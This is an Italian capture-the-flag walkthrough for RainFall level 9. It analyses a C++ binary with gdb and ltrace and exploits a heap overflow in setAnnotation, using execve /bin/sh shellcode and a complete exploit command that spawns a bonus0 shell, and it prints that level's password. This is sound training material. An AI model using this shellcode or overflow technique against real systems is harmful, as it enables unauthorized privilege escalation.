# Level 9
Controlliamo le stringhe presenti nel binario:
```
level9@RainFall:~$ readelf -p '.rodata' level9

String dump of section '.rodata':
  [     c]  T<0x88>^D^H:<0x87>^D^HN
  [    20]  P
```
purtroppo questa volta nulla di interessante, dunque passiamo a `gdb`:
```
level9@RainFall:~$ gdb -q level9
Reading symbols from /home/user/level9/level9...(no debugging symbols found)...done.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048464  _init
0x080484b0  __cxa_atexit
0x080484b0  __cxa_atexit@plt
0x080484c0  __gmon_start__
0x080484c0  __gmon_start__@plt
0x080484d0  std::ios_base::Init::Init()
0x080484d0  _ZNSt8ios_base4InitC1Ev@plt
0x080484e0  __libc_start_main
0x080484e0  __libc_start_main@plt
0x080484f0  _exit
0x080484f0  _exit@plt
0x08048500  _ZNSt8ios_base4InitD1Ev
0x08048500  _ZNSt8ios_base4InitD1Ev@plt
0x08048510  memcpy
0x08048510  memcpy@plt
0x08048520  strlen
0x08048520  strlen@plt
0x08048530  operator new(unsigned int)
0x08048530  _Znwj@plt
0x08048540  _start
0x08048570  __do_global_dtors_aux
0x080485d0  frame_dummy
0x080485f4  main
0x0804869a  __static_initialization_and_destruction_0(int, int)
0x080486da  _GLOBAL__sub_I_main
0x080486f6  N::N(int)
0x080486f6  N::N(int)
0x0804870e  N::setAnnotation(char*)
0x0804873a  N::operator+(N&)
0x0804874e  N::operator-(N&)
0x08048770  __libc_csu_init
0x080487e0  __libc_csu_fini
0x080487e2  __i686.get_pc_thunk.bx
0x080487f0  __do_global_ctors_aux
0x0804881c  _fini
(gdb) disass main
Dump of assembler code for function main:
   0x080485f4 <+0>:     push   %ebp
   0x080485f5 <+1>:     mov    %esp,%ebp
   0x080485f7 <+3>:     push   %ebx
   0x080485f8 <+4>:     and    $0xfffffff0,%esp
   0x080485fb <+7>:     sub    $0x20,%esp
   0x080485fe <+10>:    cmpl   $0x1,0x8(%ebp)
   0x08048602 <+14>:    jg     0x8048610 <main+28>
   0x08048604 <+16>:    movl   $0x1,(%esp)
   0x0804860b <+23>:    call   0x80484f0 <_exit@plt>
   0x08048610 <+28>:    movl   $0x6c,(%esp)
   0x08048617 <+35>:    call   0x8048530 <_Znwj@plt>
   0x0804861c <+40>:    mov    %eax,%ebx
   0x0804861e <+42>:    movl   $0x5,0x4(%esp)
   0x08048626 <+50>:    mov    %ebx,(%esp)
   0x08048629 <+53>:    call   0x80486f6 <_ZN1NC2Ei>
   0x0804862e <+58>:    mov    %ebx,0x1c(%esp)
   0x08048632 <+62>:    movl   $0x6c,(%esp)
   0x08048639 <+69>:    call   0x8048530 <_Znwj@plt>
   0x0804863e <+74>:    mov    %eax,%ebx
   0x08048640 <+76>:    movl   $0x6,0x4(%esp)
   0x08048648 <+84>:    mov    %ebx,(%esp)
   0x0804864b <+87>:    call   0x80486f6 <_ZN1NC2Ei>
   0x08048650 <+92>:    mov    %ebx,0x18(%esp)
   0x08048654 <+96>:    mov    0x1c(%esp),%eax
   0x08048658 <+100>:   mov    %eax,0x14(%esp)
   0x0804865c <+104>:   mov    0x18(%esp),%eax
   0x08048660 <+108>:   mov    %eax,0x10(%esp)
   0x08048664 <+112>:   mov    0xc(%ebp),%eax
   0x08048667 <+115>:   add    $0x4,%eax
   0x0804866a <+118>:   mov    (%eax),%eax
   0x0804866c <+120>:   mov    %eax,0x4(%esp)
   0x08048670 <+124>:   mov    0x14(%esp),%eax
   0x08048674 <+128>:   mov    %eax,(%esp)
   0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:   mov    0x10(%esp),%eax
   0x08048680 <+140>:   mov    (%eax),%eax
   0x08048682 <+142>:   mov    (%eax),%edx
   0x08048684 <+144>:   mov    0x14(%esp),%eax
   0x08048688 <+148>:   mov    %eax,0x4(%esp)
   0x0804868c <+152>:   mov    0x10(%esp),%eax
   0x08048690 <+156>:   mov    %eax,(%esp)
   0x08048693 <+159>:   call   *%edx
   0x08048695 <+161>:   mov    -0x4(%ebp),%ebx
   0x08048698 <+164>:   leave
   0x08048699 <+165>:   ret
End of assembler dump.
```
Scopriamo che il binario è stato scritto in c++.
Nella funzione `main` vengono inizializzate due classi `N` tramite la funzione `new` e vengono
passati due valori diversi al costruttore, prima `5` e poi `6`.
Successivamente viene chiamata la funzione `setAnnotation` della prima classe passandogli il primo argomento
del binario che verrà copiato grazie a `memcpy` all'interno della classe stessa, per poi concludere chiamando
un puntatore a funzione all'interno della seconda classe che punta all'operatore `+` passandogli come argomento
la prima classe, così il programma termina la sua esecuzione restituendo la somma degli interi presenti nelle
due classi.

Nel binario non è presente alcuna chiamata a `system` dunque bisogna iniettare uno shellcode nell'argomento per
poi sovrascrivere il puntatore di `eip` e sostituire la chiamata alla funzione presente nella seconda classe
con l'esecuzione dello shellcode.
Tramite il sito (Buffer Overflow EIP Offset String Generator)[https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/]
ho individuato l'offset a 112 caratteri:
```
level9@RainFall:~$ gdb -q level9
Reading symbols from /home/user/level9/level9...(no debugging symbols found)...done.
(gdb) r $(python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6A"')
Starting program: /home/user/level9/level9 $(python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6A"')

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) info registers eax
eax            0x41366441       1094083649
```
E uso il seguente shellcode:
```asm
section .text
global _start

_start:
  xor  eax, eax
  push eax
  push 0x68732f2f
  push 0x6e69622f
  mov  ebx, esp
  push eax
  push ebx
  mov  ecx, esp
  xor  edx, edx
  mov  al, 11
  and  esp, 0xfffffff0
  int  0x80

```
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x83\xe4\xf0\xcd\x80
```
Ora siccome bisogna dereferenziare il puntatore che andre a sovrascrivere, basta inserire alla fine dello shellcode il
puntatore all'inizio dello shellcode che a sua volta come prima cosa avrà il puntatore a se stesso ma 4 byte più avanti.
L'indirizzo della stringa l'ho scoperto nel seguente modo:
```
level9@RainFall:~$ ltrace ./level9 usavoia
__libc_start_main(0x80485f4, 2, 0xbffff7e4, 0x8048770, 0x80487e0 <unfinished ...>
_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330) = 0xb7fce990
__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330)     = 0
_Znwj(108, 0xbffff7e4, 0xbffff7f0, 0xb7d79e55, 0xb7fed280)                = 0x804a008
_Znwj(108, 5, 0xbffff7f0, 0xb7d79e55, 0xb7fed280)                         = 0x804a078
strlen("usavoia")                                                         = 7
memcpy(0x0804a00c, "usavoia", 7)                                          = 0x0804a00c
_ZNSt8ios_base4InitD1Ev(0x8049bb4, 11, 0x804a078, 0x8048738, 0x804a00c)   = 0xb7fce4a0
+++ exited (status 11) +++
```
`0x0804a00c` è dunque l'indirizzo dove `memcpy` copierà lo shellcode, quindi basta procedere così:
```
level9@RainFall:~$ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\x83\xe4\xf0\xcd\x80" + "A"*76 + "\x0c\xa0\x04\x08"')
$ id
uid=2009(level9) gid=2009(level9) euid=2010(bonus0) egid=100(users) groups=2010(bonus0),100(users),2009(level9)
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
$ exit
```
```
level9@RainFall:~$ su bonus0
Password: f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus0/bonus0
bonus0@RainFall:~$
```